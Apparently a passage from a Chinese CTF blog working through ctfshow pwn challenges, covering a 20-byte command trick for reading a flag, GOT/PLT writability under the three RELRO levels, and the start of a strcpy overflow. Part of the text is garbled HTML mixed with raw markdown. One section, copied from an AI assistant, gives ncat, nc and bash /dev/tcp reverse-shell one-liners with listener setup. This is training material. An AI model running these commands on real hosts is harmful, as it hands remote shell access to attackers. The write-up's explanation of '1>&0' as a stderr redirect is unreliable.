/ctf*</code>这一部分意味着<code>cat</code>命令将尝试显示所有以<code>ctf</code>开头的文件的内容。假设存在一个名为<code>ctfshow_flag</code>的文件，那么<code>cat</code>命令将会显示它的内容。这是许多CTF竞赛中常见的做法，旗帜文件通常包含解题的关键</li><li><strong>重定向标准输出到标准错误</strong>：<code>1&gt;&amp;0</code>是输出重定向语法的一部分，这里的<code>1</code>指的是标准输出（stdout），<code>0</code>指的是标准输入（stdin）。<code>&amp;</code>符号表示“复制描述符”。因此，<code>1&gt;&amp;0</code>意味着<u>将标准输出重定向到标准错误输出（stderr）的位置</u>，即原本标准输入被读取的地方。在大多数情况下，<code>stderr</code>和<code>stdout</code>都默认连接到终端，但它们可以被分别重定向到不同的地方</li><li><strong>规避父进程的输出捕获</strong>：在程序中，父进程在等待子进程结束后，会打印一条消息说“flag is not here!”。通过将<code>cat</code>命令的标准输出重定向到标准错误，我们可以利用子进程执行<code>cat</code>命令时的输出，而不是等待父进程的输出。由于父进程在<code>wait</code>之后立即调用了<code>printf</code>，它实际上是在读取标准输出，但我们的<code>cat</code>命令输出被<u>重定向到了标准错误</u>，因此<u>不会被父进程捕获</u></li><li><strong>利用子进程的shell</strong>：当用户在子进程中输入<code>exec cat /ctf* 1&gt;&amp;0</code>并执行时，子进程会被替换为<code>cat</code>命令，显示旗帜文件的内容，而这些内容不会被父进程看到，因为输出重定向到了标准错误，而不是标准输出</li></ol></li><li><p>这里限制了20个字节，**<u><em>反弹shell</em></u>**的话理论上也可行，感兴趣的可以自行去尝试</p></li></ul><h4 id="反弹shell（当然现在还不知道咋搞"><a class="header-anchor" href="#反弹shell（当然现在还不知道咋搞">¶</a>反弹shell（当然现在还不知道咋搞</h4><ul><li>以下来自通义灵码回答，苯人还在探索怎么做</li></ul><h5 id="1-选择反弹shell的命令"><a class="header-anchor" href="#1-选择反弹shell的命令">¶</a>1. 选择反弹shell的命令</h5><p>你需要一个简短的命令来建立一个从目标机器到你的机器的反向连接。对于基于bash的shell，你可以使用以下命令之一：</p><ul><li><strong>ncat</strong>: <code>ncat -e /bin/bash &lt;your IP&gt; &lt;your listening port&gt;</code></li><li><strong>netcat</strong>: <code>nc &lt;your IP&gt; &lt;your listening port&gt; -e /bin/bash</code></li><li><strong>bash</strong>: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;your IP&gt;/&lt;your listening port&gt; 0&gt;&amp;1'</code></li></ul><p>其中 <code>&lt;your IP&gt;</code> 是你控制的机器的IP地址，<code>&lt;your listening port&gt;</code> 是你将在上面监听的端口。</p><h5 id="2-在你的机器上监听端口"><a class="header-anchor" href="#2-在你的机器上监听端口">¶</a>2. 在你的机器上监听端口</h5><p>在你的机器上，使用<code>ncat</code>或<code>netcat</code>来监听指定的端口。例如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1ncat -lvnp &lt;your listening port&gt;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1nc -lvp &lt;your listening port&gt;</span><br></pre></td></tr></table></figure></div><p>这将打开一个监听连接，等待目标机器的反向连接</p><h5 id="3-在目标机器上执行反弹shell命令"><a class="header-anchor" href="#3-在目标机器上执行反弹shell命令">¶</a>3. 在目标机器上执行反弹shell命令</h5><p>在目标机器上，你只有20个字节的输入空间。你需要确保你的反弹shell命令足够短小，同时包含必要的信息。例如，对于<code>ncat</code>命令，你可以这样输入：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1ncat -e /bin/bash IP PORT</span><br></pre></td></tr></table></figure></div><p>但因为IP地址和端口号占用了不少字符，你需要精简这个命令。一种方法是使用<code>bash</code>命令，它通常更紧凑：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></div><p>但是由于字符限制，你可能需要进一步缩短IP地址，使用数字形式而不是域名，或者使用特殊的字符编码技术来减少字符数</p><h5 id="4-输入反弹shell命令"><a class="header-anchor" href="#4-输入反弹shell命令">¶</a>4. 输入反弹shell命令</h5><p>在目标机器的输入限制内，尽可能准确地输入反弹shell命令。例如，如果你的IP地址是<code>192.168.1.1</code>，并且你监听的端口是<code>1234</code>，你的命令可能是：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.1/1234 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></div><p>但是由于字符限制，你可能需要进一步优化这个命令</p><h5 id="示例"><a class="header-anchor" href="#示例">¶</a>示例</h5><p>一个极端的压缩版本，假设你的IP地址是<code>127.0.0.1</code>和端口是<code>4444</code>：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure></div><p>但是，请注意，<code>127.0.0.1</code>通常表示本地主机，所以在这个上下文中，你应当使用实际的IP地址</p><h3 id="020-got和-got-plt表"><a class="header-anchor" href="#020-got和-got-plt表">¶</a>020 .got和.got.plt表</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn020/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位  仅开启NX保护，RELRO保护完全关闭</span><br></pre></td></tr></table></figure></div><h4 id="RELRO保护"><a class="header-anchor" href="#RELRO保护">¶</a>RELRO保护</h4><ul><li>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。</li><li>它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure LinkageTable，简称 PLT）的可写性来防止针对这些结构的攻击</li></ul><h5 id="三种状态"><a class="header-anchor" href="#三种状态">¶</a>三种状态</h5><ol><li><p><strong>No RELRO</strong>：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</p></li><li><p><strong>Partial RELRO</strong>：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p></li><li><p><strong>Full RELRO</strong>：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p></li></ol><h4 id="开始解题"><a class="header-anchor" href="#开始解题">¶</a>开始解题</h4><ul><li><pre><code>checksec pwn
[*] '/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn020/pwn'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
64位  仅开了NX保护  RELRO完全关闭
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `objdump -R pwn`   用来显示可执行文件 `pwn` 中的动态重定位条目（dynamic relocation entries）   使用 `-R` 选项时，`objdump` 会输出所有动态重定位条目的列表</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
</code></pre></li></ul><p>objdump -R pwn</p><p>pwn: file format elf64-x86-64</p><p>DYNAMIC RELOCATION RECORDS<br>OFFSET TYPE VALUE<br>0000000000600f18 R_X86_64_GLOB_DAT __libc_start_main@GLIBC_2.2.5<br>0000000000600f20 R_X86_64_GLOB_DAT <strong>gmon_start</strong><br>0000000000600f40 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5<br>0000000000600f48 R_X86_64_JUMP_SLOT printf@GLIBC_2.2.5<br>0000000000600f50 R_X86_64_JUMP_SLOT strtol@GLIBC_2.2.5</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `readelf -S pwn`   查看表项地址</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>readelf -S pwn<br>There are 29 section headers, starting at offset 0x1878:</p><p>Section Headers:<br>[Nr] Name Type Address Offset<br>Size EntSize Flags Link Info Align<br>[ 0] NULL 0000000000000000 00000000<br>0000000000000000 0000000000000000 0 0 0<br>[ 1] .interp PROGBITS 0000000000400200 00000200<br>000000000000001c 0000000000000000 A 0 0 1<br>[ 2] .note.ABI-tag NOTE 000000000040021c 0000021c<br>0000000000000020 0000000000000000 A 0 0 4<br>[ 3] .note.gnu.build-i NOTE 000000000040023c 0000023c<br>0000000000000024 0000000000000000 A 0 0 4<br>[ 4] .gnu.hash GNU_HASH 0000000000400260 00000260<br>000000000000001c 0000000000000000 A 5 0 8<br>[ 5] .dynsym DYNSYM 0000000000400280 00000280<br>0000000000000090 0000000000000018 A 6 1 8<br>[ 6] .dynstr STRTAB 0000000000400310 00000310<br>000000000000004b 0000000000000000 A 0 0 1<br>[ 7] .gnu.version VERSYM 000000000040035c 0000035c<br>000000000000000c 0000000000000002 A 5 0 2<br>[ 8] .gnu.version_r VERNEED 0000000000400368 00000368<br>0000000000000020 0000000000000000 A 6 1 8<br>[ 9] .rela.dyn RELA 0000000000400388 00000388<br>0000000000000030 0000000000000018 A 5 0 8<br>[10] .rela.plt RELA 00000000004003b8 000003b8<br>0000000000000048 0000000000000018 AI 5 22 8<br>[11] .init PROGBITS 0000000000400400 00000400<br>0000000000000017 0000000000000000 AX 0 0 4<br>[12] .plt PROGBITS 0000000000400420 00000420<br>0000000000000040 0000000000000010 AX 0 0 16<br>[13] .text PROGBITS 0000000000400460 00000460<br>0000000000000252 0000000000000000 AX 0 0 16<br>[14] .fini PROGBITS 00000000004006b4 000006b4<br>0000000000000009 0000000000000000 AX 0 0 4<br>[15] .rodata PROGBITS 00000000004006c0 000006c0<br>000000000000053a 0000000000000000 A 0 0 8<br>[16] .eh_frame_hdr PROGBITS 0000000000400bfc 00000bfc<br>000000000000003c 0000000000000000 A 0 0 4<br>[17] .eh_frame PROGBITS 0000000000400c38 00000c38<br>0000000000000100 0000000000000000 A 0 0 8<br>[18] .init_array INIT_ARRAY 0000000000600d38 00000d38<br>0000000000000008 0000000000000008 WA 0 0 8<br>[19] .fini_array FINI_ARRAY 0000000000600d40 00000d40<br>0000000000000008 0000000000000008 WA 0 0 8<br>[20] .dynamic DYNAMIC 0000000000600d48 00000d48<br>00000000000001d0 0000000000000010 WA 6 0 8<br>[21] .got PROGBITS 0000000000600f18 00000f18<br>0000000000000010 0000000000000008 WA 0 0 8<br>[22] .got.plt PROGBITS 0000000000600f28 00000f28<br>0000000000000030 0000000000000008 WA 0 0 8<br>[23] .data PROGBITS 0000000000600f58 00000f58<br>0000000000000010 0000000000000000 WA 0 0 8<br>[24] .bss NOBITS 0000000000600f68 00000f68<br>0000000000000008 0000000000000000 WA 0 0 1<br>[25] .comment PROGBITS 0000000000000000 00000f68<br>0000000000000029 0000000000000001 MS 0 0 1<br>[26] .symtab SYMTAB 0000000000000000 00000f98<br>00000000000005e8 0000000000000018 27 43 8<br>[27] .strtab STRTAB 0000000000000000 00001580<br>00000000000001f1 0000000000000000 0 0 1<br>[28] .shstrtab STRTAB 0000000000000000 00001771<br>0000000000000103 0000000000000000 0 0 1<br>Key to Flags:<br>W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>L (link order), O (extra OS processing required), G (group), T (TLS),<br>C (compressed), x (unknown), o (OS specific), E (exclude),<br>l (large), p (processor specific)</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 提取关键部分：</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>[21] .got PROGBITS 0000000000600f18 00000f18<br>0000000000000010 0000000000000008 WA 0 0 8<br>[22] .got.plt PROGBITS 0000000000600f28 00000f28<br>0000000000000030 0000000000000008 WA 0 0 8</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `.got`  `600f18`</span><br><span class="line">- `.got.plt`  `600f28`</span><br><span class="line">- 测试一下：</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>./pwn 600f18<br>RELRO: 52454c52</p><p>ctfshow@ubuntu:~/Desktop/ctfshow-pwn-primary/pwn020$ ./pwn 600f28<br>RELRO: 52454c52</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 发现程序正常执行，.got表和.got.plt表都可写</span><br><span class="line">- ctfshow&#123;1_1_0x600f18_0x600f28&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 021  .got和.got.plt表</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>checksec pwn<br>[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn021/pwn’<br>Arch: amd64-64-little<br>RELRO: Partial RELRO<br>Stack: No canary found<br>NX: NX enabled<br>PIE: No PIE (0x400000)<br>64位 NX关闭 RELRO保护部分开启</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div><p>objdump -R pwn</p><p>pwn: file format elf64-x86-64</p><p>DYNAMIC RELOCATION RECORDS<br>OFFSET TYPE VALUE<br>0000000000600ff0 R_X86_64_GLOB_DAT __libc_start_main@GLIBC_2.2.5<br>0000000000600ff8 R_X86_64_GLOB_DAT <strong>gmon_start</strong><br>0000000000601018 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5<br>0000000000601020 R_X86_64_JUMP_SLOT printf@GLIBC_2.2.5<br>0000000000601028 R_X86_64_JUMP_SLOT strtol@GLIBC_2.2.5</p><p>readelf -S pwn<br>There are 29 section headers, starting at offset 0x1950:</p><p>Section Headers:<br>[Nr] Name Type Address Offset<br>Size EntSize Flags Link Info Align<br>[ 0] NULL 0000000000000000 00000000<br>0000000000000000 0000000000000000 0 0 0<br>[ 1] .interp PROGBITS 0000000000400238 00000238<br>000000000000001c 0000000000000000 A 0 0 1<br>[ 2] .note.ABI-tag NOTE 0000000000400254 00000254<br>0000000000000020 0000000000000000 A 0 0 4<br>[ 3] .note.gnu.build-i NOTE 0000000000400274 00000274<br>0000000000000024 0000000000000000 A 0 0 4<br>[ 4] .gnu.hash GNU_HASH 0000000000400298 00000298<br>000000000000001c 0000000000000000 A 5 0 8<br>[ 5] .dynsym DYNSYM 00000000004002b8 000002b8<br>0000000000000090 0000000000000018 A 6 1 8<br>[ 6] .dynstr STRTAB 0000000000400348 00000348<br>000000000000004b 0000000000000000 A 0 0 1<br>[ 7] .gnu.version VERSYM 0000000000400394 00000394<br>000000000000000c 0000000000000002 A 5 0 2<br>[ 8] .gnu.version_r VERNEED 00000000004003a0 000003a0<br>0000000000000020 0000000000000000 A 6 1 8<br>[ 9] .rela.dyn RELA 00000000004003c0 000003c0<br>0000000000000030 0000000000000018 A 5 0 8<br>[10] .rela.plt RELA 00000000004003f0 000003f0<br>0000000000000048 0000000000000018 AI 5 22 8<br>[11] .init PROGBITS 0000000000400438 00000438<br>0000000000000017 0000000000000000 AX 0 0 4<br>[12] .plt PROGBITS 0000000000400450 00000450<br>0000000000000040 0000000000000010 AX 0 0 16<br>[13] .text PROGBITS 0000000000400490 00000490<br>0000000000000252 0000000000000000 AX 0 0 16<br>[14] .fini PROGBITS 00000000004006e4 000006e4<br>0000000000000009 0000000000000000 AX 0 0 4<br>[15] .rodata PROGBITS 00000000004006f0 000006f0<br>000000000000053a 0000000000000000 A 0 0 8<br>[16] .eh_frame_hdr PROGBITS 0000000000400c2c 00000c2c<br>000000000000003c 0000000000000000 A 0 0 4<br>[17] .eh_frame PROGBITS 0000000000400c68 00000c68<br>0000000000000100 0000000000000000 A 0 0 8<br>[18] .init_array INIT_ARRAY 0000000000600e10 00000e10<br>0000000000000008 0000000000000008 WA 0 0 8<br>[19] .fini_array FINI_ARRAY 0000000000600e18 00000e18<br>0000000000000008 0000000000000008 WA 0 0 8<br>[20] .dynamic DYNAMIC 0000000000600e20 00000e20<br>00000000000001d0 0000000000000010 WA 6 0 8<br>[21] .got PROGBITS 0000000000600ff0 00000ff0<br>0000000000000010 0000000000000008 WA 0 0 8<br>[22] .got.plt PROGBITS 0000000000601000 00001000<br>0000000000000030 0000000000000008 WA 0 0 8<br>[23] .data PROGBITS 0000000000601030 00001030<br>0000000000000010 0000000000000000 WA 0 0 8<br>[24] .bss NOBITS 0000000000601040 00001040<br>0000000000000008 0000000000000000 WA 0 0 1<br>[25] .comment PROGBITS 0000000000000000 00001040<br>0000000000000029 0000000000000001 MS 0 0 1<br>[26] .symtab SYMTAB 0000000000000000 00001070<br>00000000000005e8 0000000000000018 27 43 8<br>[27] .strtab STRTAB 0000000000000000 00001658<br>00000000000001f1 0000000000000000 0 0 1<br>[28] .shstrtab STRTAB 0000000000000000 00001849<br>0000000000000103 0000000000000000 0 0 1<br>Key to Flags:<br>W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>L (link order), O (extra OS processing required), G (group), T (TLS),<br>C (compressed), x (unknown), o (OS specific), E (exclude),<br>l (large), p (processor specific)</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div><p>[21] .got PROGBITS 0000000000600ff0 00000ff0<br>0000000000000010 0000000000000008 WA 0 0 8<br>[22] .got.plt PROGBITS 0000000000601000 00001000<br>0000000000000030 0000000000000008 WA 0 0 8</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 程序头多了GNU_RELRO，将.dynamic 、.got标记为只读权限（R），那么在重定向完成后，动态链接器就会将这个区域保护起来</span><br><span class="line">- 写.got表的时候就会抛出异常，而写.got.plt依旧正常</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>./pwn 600ff0<br>Segmentation fault</p><p>ctfshow@ubuntu:~/Desktop/ctfshow-pwn-primary/pwn021$ ./pwn 601000<br>RELRO: 52454c52</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ctfshow&#123;0_1_0x600ff0_0x601000&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 022  .got和.got.plt表</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>checksec pwn<br>[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn022/pwn’<br>Arch: amd64-64-little<br>RELRO: Full RELRO<br>Stack: No canary found<br>NX: NX enabled<br>PIE: No PIE (0x400000)<br>64位 完全开启了RELRO保护</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div><p>readelf -S pwn<br>There are 28 section headers, starting at offset 0x1900:</p><p>Section Headers:<br>[Nr] Name Type Address Offset<br>Size EntSize Flags Link Info Align<br>[ 0] NULL 0000000000000000 00000000<br>0000000000000000 0000000000000000 0 0 0<br>[ 1] .interp PROGBITS 0000000000400238 00000238<br>000000000000001c 0000000000000000 A 0 0 1<br>[ 2] .note.ABI-tag NOTE 0000000000400254 00000254<br>0000000000000020 0000000000000000 A 0 0 4<br>[ 3] .note.gnu.build-i NOTE 0000000000400274 00000274<br>0000000000000024 0000000000000000 A 0 0 4<br>[ 4] .gnu.hash GNU_HASH 0000000000400298 00000298<br>000000000000001c 0000000000000000 A 5 0 8<br>[ 5] .dynsym DYNSYM 00000000004002b8 000002b8<br>0000000000000090 0000000000000018 A 6 1 8<br>[ 6] .dynstr STRTAB 0000000000400348 00000348<br>000000000000004b 0000000000000000 A 0 0 1<br>[ 7] .gnu.version VERSYM 0000000000400394 00000394<br>000000000000000c 0000000000000002 A 5 0 2<br>[ 8] .gnu.version_r VERNEED 00000000004003a0 000003a0<br>0000000000000020 0000000000000000 A 6 1 8<br>[ 9] .rela.dyn RELA 00000000004003c0 000003c0<br>0000000000000030 0000000000000018 A 5 0 8<br>[10] .rela.plt RELA 00000000004003f0 000003f0<br>0000000000000048 0000000000000018 AI 5 21 8<br>[11] .init PROGBITS 0000000000400438 00000438<br>0000000000000017 0000000000000000 AX 0 0 4<br>[12] .plt PROGBITS 0000000000400450 00000450<br>0000000000000040 0000000000000010 AX 0 0 16<br>[13] .text PROGBITS 0000000000400490 00000490<br>0000000000000252 0000000000000000 AX 0 0 16<br>[14] .fini PROGBITS 00000000004006e4 000006e4<br>0000000000000009 0000000000000000 AX 0 0 4<br>[15] .rodata PROGBITS 00000000004006f0 000006f0<br>000000000000053a 0000000000000000 A 0 0 8<br>[16] .eh_frame_hdr PROGBITS 0000000000400c2c 00000c2c<br>000000000000003c 0000000000000000 A 0 0 4<br>[17] .eh_frame PROGBITS 0000000000400c68 00000c68<br>0000000000000100 0000000000000000 A 0 0 8<br>[18] .init_array INIT_ARRAY 0000000000600dc0 00000dc0<br>0000000000000008 0000000000000008 WA 0 0 8<br>[19] .fini_array FINI_ARRAY 0000000000600dc8 00000dc8<br>0000000000000008 0000000000000008 WA 0 0 8<br>[20] .dynamic DYNAMIC 0000000000600dd0 00000dd0<br>00000000000001f0 0000000000000010 WA 6 0 8<br>[21] .got PROGBITS 0000000000600fc0 00000fc0<br>0000000000000040 0000000000000008 WA 0 0 8<br>[22] .data PROGBITS 0000000000601000 00001000<br>0000000000000010 0000000000000000 WA 0 0 8<br>[23] .bss NOBITS 0000000000601010 00001010<br>0000000000000008 0000000000000000 WA 0 0 1<br>[24] .comment PROGBITS 0000000000000000 00001010<br>0000000000000029 0000000000000001 MS 0 0 1<br>[25] .symtab SYMTAB 0000000000000000 00001040<br>00000000000005d0 0000000000000018 26 42 8<br>[26] .strtab STRTAB 0000000000000000 00001610<br>00000000000001f1 0000000000000000 0 0 1<br>[27] .shstrtab STRTAB 0000000000000000 00001801<br>00000000000000fa 0000000000000000 0 0 1<br>Key to Flags:<br>W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>L (link order), O (extra OS processing required), G (group), T (TLS),<br>C (compressed), x (unknown), o (OS specific), E (exclude),<br>l (large), p (processor specific)</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div><p>[21] .got PROGBITS 0000000000600fc0 00000fc0<br>0000000000000040 0000000000000008 WA 0 0 8</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 没有了.got.plt，且.got也不可写</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>./pwn 600fc0</p><p>Segmentation fault // 抛出了异常</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ctfshow&#123;0_0_0x600fc0&#125;</span><br><span class="line"></span><br><span class="line">### 023  溢出？</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>checksec pwn<br>[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn023/pwn’<br>Arch: i386-32-little<br>RELRO: Partial RELRO<br>Stack: No canary found<br>NX: NX enabled<br>PIE: No PIE (0x8048000)<br>32位 开启NX保护 部分开启RELRO保护</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __gid_t v3; // eax</span><br><span class="line">  int v5; // [esp-Ch] [ebp-2Ch]</span><br><span class="line">  int v6; // [esp-8h] [ebp-28h]</span><br><span class="line">  int v7; // [esp-4h] [ebp-24h]</span><br><span class="line">  FILE *stream; // [esp+4h] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, 64, stream);</span><br><span class="line">  signal(11, (__sighandler_t)sigsegv_handler);  // 注册信号处理器  不懂喵= =</span><br><span class="line">  v3 = getegid();  // 获取当前进程的有效组ID</span><br><span class="line">  setresgid(v3, v3, v3, v5, v6, v7, v3);  // 尝试设置进程的实时组ID  但是不懂= =</span><br><span class="line">    </span><br><span class="line">    // 美术部分</span><br><span class="line">  puts(asc_8048940);</span><br><span class="line">  puts(asc_80489B4);</span><br><span class="line">  puts(asc_8048A30);</span><br><span class="line">  puts(asc_8048ABC);</span><br><span class="line">  puts(asc_8048B4C);</span><br><span class="line">  puts(asc_8048BD0);</span><br><span class="line">  puts(asc_8048C64);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(aClassifyCtfsho);</span><br><span class="line">  puts(&quot;    * Type  : Linux_Security_Mechanisms                               &quot;);</span><br><span class="line">  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);</span><br><span class="line">  puts(&quot;    * Hint  : No canary found                                         &quot;);</span><br><span class="line">  puts(&quot;    * *************************************                           &quot;);</span><br><span class="line">  puts(&quot;How to input ?&quot;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  if ( argc &gt; 1 )  // 检测是否有额外的命令行参数，并将第一个命令行参数作为参数传递给该函数</span><br><span class="line">    ctfshow((char *)argv[1]);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *__cdecl ctfshow(char *src)</span><br><span class="line">&#123;</span><br><span class="line">  char dest[58]; // [esp+Ah] [ebp-3Eh] BYREF</span><br><span class="line"></span><br><span class="line">  return strcpy(dest, src);</span><br><span class="line">&#125;</span><br><span class="line">/* 接受一个字符串参数 src ，并使用 strcpy 